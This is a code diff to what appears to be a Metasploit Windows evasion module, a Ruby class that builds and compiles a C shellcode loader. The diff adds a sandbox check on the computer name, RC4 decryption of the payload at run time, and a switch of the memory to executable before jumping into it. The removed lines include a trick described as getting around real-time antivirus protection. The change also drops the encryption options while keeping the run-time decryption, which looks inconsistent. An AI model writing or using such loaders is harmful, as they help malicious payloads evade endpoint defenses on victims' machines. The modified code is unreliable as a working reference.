@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'metasploit/framework/compiler/windows'
+
 class MetasploitModule < Msf::Evasion
 
   def initialize(info={})
@@ -33,11 +35,12 @@ class MetasploitModule < Msf::Evasion
     @c_payload ||= lambda {
       opts = { format: 'rc4', key: rc4_key }
       junk = Rex::Text.rand_text(10..1024)
-      p = payload.encoded + junk
+      p = payload.class.method_defined?(:encoded) ? payload.encoded : payload
+      p = p + junk
 
       return {
         size: p.length,
-        c_format: Msf::Simple::Buffer.transform(p, 'c', 'buf', opts)
+        c_format: Msf::Simple::Buffer.transform(p, 'c', 'buf')
       }
     }.call
   end
@@ -50,21 +53,25 @@ class MetasploitModule < Msf::Evasion
 #{get_payload[:c_format]}
 
 int main() {
-  int lpBufSize = sizeof(int) * #{get_payload[:size]};
-  LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x00000040);
-  memset(lpBuf, '\\0', lpBufSize);
-
-  HANDLE proc = OpenProcess(0x1F0FFF, false, 4);
-  // Checking NULL allows us to get around Real-time protection
-  if (proc == NULL) {
-    RC4("#{rc4_key}", buf, (char*) lpBuf, #{get_payload[:size]});
-    void (*func)();
-    func = (void (*)()) lpBuf;
-    (void)(*func)();
-  }
-
-  return 0;
+  DWORD size;
+    char computerName[15];
+    GetComputerNameA(computerName, &size);
+    if(strcmp("HAL9TH", computerName)){
+        LPVOID lpBuf = VirtualAlloc(NULL, sizeof buf, MEM_COMMIT, 0x00000004);
+        memset(lpBuf, '\\0', sizeof buf);
+        RC4("#{rc4_key}", buf, lpBuf, sizeof buf);
+        DWORD ignore;
+        VirtualProtect(lpBuf, sizeof buf, 0x00000010, &ignore);
+        ((void(*)())lpBuf)();
+    }
+    return 0;
 }|
+  end
+
+  def generate_bin(code)
+    @payload = code
+    $stderr.puts c_template
+    bin = Metasploit::Framework::Compiler::Windows.compile_c(c_template)
   end
 
   def run
